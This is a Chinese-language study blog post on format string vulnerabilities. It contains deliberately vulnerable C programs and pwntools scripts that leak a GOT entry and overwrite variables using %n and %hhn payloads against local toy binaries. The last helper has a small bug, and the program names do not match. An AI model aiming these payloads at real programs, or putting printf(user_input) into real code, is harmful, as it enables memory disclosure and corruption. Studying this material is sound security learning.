---
layout:     post
title:      格式化字符串漏洞
subtitle:   
date:       2023-10-15
author:     Kody Black
header-img: img/post-bg-normal.jpg
catalog: true
tags:
    - pwn
---

格式化字符漏洞

主要利用到以下的4种格式：

- s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。
- x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
- p， void * 型，输出对应变量的值。printf("%p",a) 用地址的格式打印变量 a 的值，printf("%p", &a) 打印变量 a 所在的地址。
- n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。

### 漏洞原理

wiki上面写的很详细了，直接复制如下：

```
Input: printf("Color %s, Number %d, Float %4.2f", "red", 123456, 3.14)
Output: Color red, Number 123456, Float 3.14
```

以上面的函数为例，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下

```
some value
3.14
123456
addr of "red"
addr of format string: Color %s...
```

在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况

- 当前字符不是 %，直接输出到相应标准输出。
- 当前字符是 %， 继续读取下一个字符
  - 如果没有字符，报错
  - 如果下一个字符是 %, 输出 %
  - 否则根据相应的字符，获取相应的参数，对其进行解析并输出

那么假设，此时我们在编写程序时候，写成了下面的样子

```
printf("Color %s, Number %d, Float %4.2f");
```

此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为

1. 解析其地址对应的字符串
2. 解析其内容对应的整形值
3. 解析其内容对应的浮点值

对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。

### 利用

1. 利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。
2. 利用 %s 来获取变量所对应地址的内容，只不过有零截断。
3. 利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。

```c
// 目标程序：leakmemory
// 编译：gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
```

#### 获知格式化字符串位置

首先通过`aaaa%p%p%p%p%p%p%p%p%p%p`查看输出中的0x41414141所在的位置，例如：

```
./leakmemory
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p
AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x70257025%
```

可以看到，0x41414141是第四个%p得到的结果，从而确定当前的格式化字符串的起始地址是输入函数的第五个参数，格式化字符串的第四个参数。

#### 泄露任意地址内存

如果我们获取到`leakmemory.got['__isoc99_scanf']`的地址为0x804c014，就可以通过输入`b'\x14\xc0\x04\x08%4$s'`，来得到`__isoc99_scanf`对应的libc的位置。exp如下：

```
from pwn import *
sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print (hex(__isoc99_scanf_got))
payload = p32(__isoc99_scanf_got) + b'%4$s'
print (payload)
# gdb.attach(sh)
sh.sendline(payload)
print (hex(u32(sh.recv()[4:8]))) # remove the first bytes of __isoc99_scanf@got
```

#### 覆盖内存

```c
//目标程序：overflow
/* example/overflow/overflow.c */
#include <stdio.h>
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
    puts("modified b for a big number!");
  }
  return 0;
}
```

首先获取格式化字符串的位置

```
0xffd006bc
aaaa%p%p%p%p%p%p%p%p%p%p%p
aaaa0xffd006580xf7f357b00x1(nil)0x10x616161610x702570250x702570250x702570250x702570250x70257025%
```

可以看到是`0x61616161`是格式化字符串的第六个参数。

修改c的值为16的exp如下：

```
from pwn import *

sh = process('./overwrite') 
# gdb.attach(sh)

c_addr = int(sh.recvuntil(b'\n', drop=True), 16)
success('get c_addr: ' + hex(c_addr))

# 注意%n是将已经输出的字符的长度写入到指定地址
# 所以我们需要先输出c_addr共4个字节
# %012p用来将一个指针的地址以十六进制形式输出，并且总宽度为12个字符（包括前缀0x）
# 此时我们总输出了16个字节，再使用%n将16写入到c_addr中

payload = p32(c_addr) + b'%012p' + b'%6$n'
success('payload: ' + str(payload))
sh.sendline(payload)
print(sh.recv())
```

修改c的值为2的exp如下：

```
from pwn import *

sh = process('./overwrite') 
overwrite = ELF('./overwrite')
# gdb.attach(sh)  

'''
因为a,b是全局变量，所以可以直接找到它的地址  
65: 0804a024     4 OBJECT  GLOBAL DEFAULT   25 a
52: 0804a028     4 OBJECT  GLOBAL DEFAULT   25 b
'''
a_addr = overwrite.symbols['a']
sh.recvuntil(b'\n')

'''
aa%8是第6个参数，$nxx是第7个，a_addr是第8个  
所以这里是先输出aa，使得输出字符数为2，然后通过%n将a的值修改为2  
最后的xx是为了和%n组合补齐8个字节
'''
payload = b'aa%8$nxx' + p32(a_addr)
success('payload: ' + str(payload))
sh.sendline(payload)
print(sh.recv())
```

下图为执行printf时的栈，同样可以看到：

- a的地址是函数第9个参数（格式化字符串的第8个参数）
- $nxx 刚好8个字节补齐

 ![16973665339831697366533459.png](https://fastly.jsdelivr.net/gh/distiny-cool/pictures@main/images/16973665339831697366533459.png)

修改b为0x12345678的exp如下：

这个exp还没看明白，改天继续研究

```
from pwn import *

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr

def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i).decode('latin1')
        else:
            payload += p64(addr + i).decode('latin1')
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload.encode('latin1')

sh = process('./overwrite') 
overwrite = ELF('./overwrite')
# gdb.attach(sh)

b_addr = overwrite.symbols['b']
sh.recvuntil(b'\n')

payload = fmt_str(6,4,b_addr,0x12345678)
success('payload: ' + str(payload))
sh.sendline(payload)
print(sh.recv())

```

